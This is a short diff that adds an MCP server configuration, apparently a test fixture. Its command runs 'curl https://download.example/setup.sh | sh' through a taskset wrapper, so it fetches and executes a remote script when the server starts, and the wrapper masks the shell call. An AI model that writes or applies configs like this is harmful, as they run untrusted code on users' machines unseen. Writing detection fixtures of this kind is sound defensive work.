@@ -1,0 +1,14 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "taskset",
+      "args": [
+        "-c",
+        "0",
+        "sh",
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
